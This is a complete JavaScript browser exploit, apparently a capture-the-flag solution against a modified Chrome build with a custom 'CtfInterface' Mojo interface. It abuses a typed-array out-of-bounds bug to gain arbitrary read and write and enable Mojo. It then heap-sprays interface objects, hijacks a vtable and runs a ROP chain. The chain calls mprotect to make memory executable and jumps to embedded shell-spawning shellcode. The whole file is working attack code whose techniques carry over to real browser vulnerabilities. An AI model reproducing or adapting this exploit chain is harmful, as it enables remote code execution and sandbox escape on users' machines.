let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.fhw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.flw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function toLittle(num, buf) {
	return new DataView(buf).getBigUint64(0, false);
}

function wait() {
    while(true) {}
}

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

/*
 * IEEE 754 double loses precision when fraction needs more than 52 bit
 *
 * log(0x4141414141414141, 0x2) = 62
 *
 * For every extra bit the steps between the representable numbers
 * increases by *2. Therefore 0x4141414141414141 will have a 2**10 rounding
 * error
 */
let marker = 0x4141414141414141
let marker2 = 0x1337133713371337n
let marker3 = 0x4141414141414141n
const isolate_l = 0xffffffffn;
const isolate_h = 0xffffffff00000000n;

async function pwn() {

    if (typeof Mojo == "undefined") {
        stage1();
    }
    else {
        await stage2();
    }
}

function make_primitives() {
    marker = marker.i2f()

    let victim = new Uint32Array(0x1);
    victim[0] = 0x42;
    let oob_arr = [marker, marker, marker, marker];
    let obj_arr = [{}];
    let www_arr = new BigUint64Array(0x1);

    let evil = new Uint32Array(0x1);
    evil[0] = 0x100;

    // corrupt size of oob_arr 
    victim.set(evil, 28);

    console.log("[+] oob_arr.length = " + oob_arr.length);
    return [oob_arr, obj_arr, www_arr];
}

/*
 * Bug: simple oob read / write for typearray objects
 */
function stage1() {
    function addr_of(obj) {
        obj_arr[0] = obj;

        // offset of obj_arr element from oob_arr
        return oob_arr[5].f2i() & isolate_l;
    }

    // change typedarray buffer pointer and read from index zero
    function aar(addr) {
        addr -= BigInt(0x8);

        let back_h = oob_arr[26].f2i();
        let back_l = oob_arr[27].f2i();

        let l = (back_l & isolate_l << 32n) | (addr & isolate_l);
        let h = ((addr >> 32n & isolate_l) << 32n) | (back_h & isolate_l);

        oob_arr[26] = h.i2f();
        oob_arr[27] = l.i2f();

        let val = www_arr[0];

        oob_arr[26] = back_h.i2f();
        oob_arr[27] = back_l.i2f();

        return val;
    }

    // change typedarray buffer pointer and write to index zero
    function aaw(addr, val) {
        addr -= 0x8n;

        let back_h = oob_arr[26].f2i();
        let back_l = oob_arr[27].f2i();

        let l = (back_l & isolate_l << 32n) | (addr & isolate_l);
        let h = ((addr >> 32n & isolate_l) << 32n) | (back_h & isolate_l);

        oob_arr[26] = h.i2f();
        oob_arr[27] = l.i2f();

        www_arr[0] = val;

        oob_arr[26] = back_h.i2f();
        oob_arr[27] = back_l.i2f();
    }

    console.log("[+] Stage 1 start");

    let [oob_arr, obj_arr, www_arr] = make_primitives()
    let heap_upper = oob_arr[26].f2i() & isolate_h;

    //console.log("[+] heap upper = ", heap_upper.hex());

    /* leak chrome base from HTMLDivElement class */
    let div = document.createElement('div');
    let addr_div = heap_upper | addr_of(div);
    let addr_HTMLDivElement = aar(addr_div + 0xcn);
    let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;

    console.log("[+] chrome base = ", chrome_base.hex());

    let addr_mojo_flag = chrome_base + 0xc560f0en;
    addr_mojo_flag &= BigInt(0xfffffffffffffff8n);

    console.log("[+] mojo flag addr = ", addr_mojo_flag.hex());

    /* turn on mojo */
    aaw(addr_mojo_flag, 0x0101010101010101n);

    window.location.reload();
}

/*
 * Bug: oob read / write inside custom interface (CtfInterface)
 */
async function stage2() {
    async function read_vec(p, off) {
        return (await p.read(off)).value.f2i();
    }
    console.log("[+] Stage 2 start");
    /*
     * Goal: Use oob read / write to corrupt the vtable of a CtfInterface
     * object
     *
     * - Need to first find a CtfInterface object which requires 
     *   spraying since chrome heap is busy
     */
    spray = []
    for (let i = 0; i < 0x100; i++) {
        let p = new blink.mojom.CtfInterfacePtr();
        Mojo.bindInterface(blink.mojom.CtfInterface.name,
                      mojo.makeRequest(p).handle);

        await p.resizeVector(0x20 / 0x8);
        await p.write(marker2.i2f(), 0);
        await p.write(marker3.i2f(), 3);
        spray.push(p);
    }

    //console.log((await spray[0].read(0x0)).value.f2i().hex());
    let evil = new blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name,
                      mojo.makeRequest(evil).handle);

    /* resize evil vector to same size as CtfInterface */
    evil.resizeVector(0x20 / 0x8);

    for (let i = 0; i < 0x100; i++) {
        let p = new blink.mojom.CtfInterfacePtr();
        Mojo.bindInterface(blink.mojom.CtfInterface.name,
                      mojo.makeRequest(p).handle);

        await p.resizeVector(0x20 / 0x8);
        await p.write(marker2.i2f(), 0);
        await p.write(marker3.i2f(), 3);
        spray.push(p);
    }

    /*
     * vtable ptr ends with 0x4e0
     * then comes vector _M_start and _M_finish which
     * are 0x20 bytes apart based on our resizing
     *
     * note: fking qemu gdb search sucks ass
     */
    let offset = -1;
    for (let i = 1; i < 0x80; i++) {
        let a0 = await read_vec(evil, 0x20 / 0x8 * i);
        let a1 = await read_vec(evil, 0x20 / 0x8 * i + 0x1);
        let a2 = await read_vec(evil, 0x20 / 0x8 * i + 0x2);

        if ((a0 & 0xfffn) == 0x4e0n && a2 - a1 == 0x20n) {
            offset = (0x20 / 0x8) * i;
            break;
        }
    }

    // reload and try again
    if (offset == -1) {
        window.location.reload();
    }

    /**
     * vtable is first ptr in memory layout of object,
     * afterwards comes vector
     *
     * gain aar / aaw by changing vector _M_start pointer 
     * (offset + 0x1 due to vector being double)
     *
     */
    async function aar(addr) {
        let old_ptr = await read_vec(evil, offset + 0x1);

        await evil.write(addr.i2f(), offset + 0x1);

        let val = await read_vec(victim, 0x0);

        await evil.write(old_ptr.i2f(), offset + 0x1);

        return val;
    }

    async function aaw(addr, val) {
        let old_ptr = await read_vec(evil, offset + 0x1);

        await evil.write(addr.i2f(), offset + 0x1);

        await victim.write(val.i2f(), 0x0);

        await evil.write(old_ptr.i2f(), offset + 0x1);
    }

    let vtable = await read_vec(evil, offset);
    console.log("[+] vtable = ", vtable.hex());

    let chrome_base = vtable - 0xbc774e0n;
    console.log("[+] chrome base = ", chrome_base.hex());

    // offset of data_sec
    let data_sec = 0xc2d0b80n;

    let data_sec_page = chrome_base + (data_sec & ~0xfffn);
    console.log("[+] data sec page = ", data_sec_page.hex());

    let pivot = chrome_base + data_sec +0x1000n;
    console.log("[+] pivot = ", pivot.hex());

    /*
     * Find interface ptr with vector we can corrupt by changing 
     * the vector.start pointer to be equal to vector.end
     */
    let victim;
    let old_ptr = await read_vec(evil, offset + 0x1);
    let vec_end = (await read_vec(evil, offset + 0x2)) - 0x8n;
    await evil.write(vec_end.i2f(), offset + 0x1);
    for (let i = 0; i < 0x200; i++) { 
        let p = spray[i];
        let val = await read_vec(p, 0);
        
        // val == merker3 => vector.start == vector.end
        if (val == marker3) {
            victim = p;
            break;
        }
    }
    // restore old ptr
    await evil.write(old_ptr.i2f(), offset + 0x1);

    if (typeof victim == "undefined") {
        console.log("unable to find victim");
        /*
         * just reload and try again <3 new process new chance
         */
        window.location.reload();
        return;
    }

    console.log("[+] found victim");

    /*
     * Found victim object now use it to make page in data sec
     * where our sc is stored rwx and jump to it
     */

    let syscall = chrome_base + 0x800dd77n;
    console.log("syscall: ", syscall.hex());

    let b = chrome_base + 0x373dfb9n;
    console.log("break: ", b.hex());

    let add_rsp_20 = chrome_base + 0x3ebdd5en + 0x2n;
    console.log("add_rsp: ", add_rsp_20.hex());

    let chg_rax_rsp = chrome_base + 0x590510en;
    console.log("chg_rax_rsp: ", chg_rax_rsp.hex());

    let pop_rdi_ret = chrome_base + 0xa6715een;
    let pop_rsi_ret = chrome_base + 0x690e5e6n;
    let pop_rdx_ret = chrome_base + 0x368287bn;
    let pop_rax_ret = chrome_base + 0xa80e2edn;

    let int3 = add_rsp_20 + 0x6n
    console.log("int3: ", int3.hex());

    let rop = [];

    // fake vtable
    // hijack vtabe of CtfInterface object
    for (let i = 0; i < 0x3; i++) {
        //rop.push(int3);
        rop.push(add_rsp_20);
    }

    /*
     * victim.read(0) tiggers this gadget and makes rsp point to
     * beginning of the vtable => add_rsp_20 gadget
     *
     * add_rsp_20 gadget then points rsp to our ropchain
     */
    rop.push(chg_rax_rsp);

    rop.push(marker3);
    // rbp fake
    rop.push(data_sec);

    let sc_addr = data_sec_page + 0x1c00n
    console.log("[+] sc addr = ", sc_addr.hex());

    /**
     * Make data_sec rwx then jump to sc
     */
    let chain = [
        pop_rdi_ret,
        data_sec_page,
        pop_rsi_ret,
        0x4000n,
        pop_rdx_ret,
        0x7n,
        pop_rax_ret,
        0xan,
        syscall,
        sc_addr,
        0x6e69622fb848686an,
        0xe7894850732f2f2fn,
        0x2434810101697268n,
        0x6a56f63101010101n,
        0x894856e601485e08n,
        0x050f583b6ad231e6n
    ];

    rop = rop.concat(chain);

    // write fake vtable + rop chain after
    for (let i = 0; i < rop.length; i++) {
        await aaw(pivot + BigInt(i * 0x8), rop[i]);
    }

    // corrupt vtable pointer
    await evil.write(pivot.i2f(), offset);

    // trigger
    await victim.read(0);

    wait();
}

pwn()

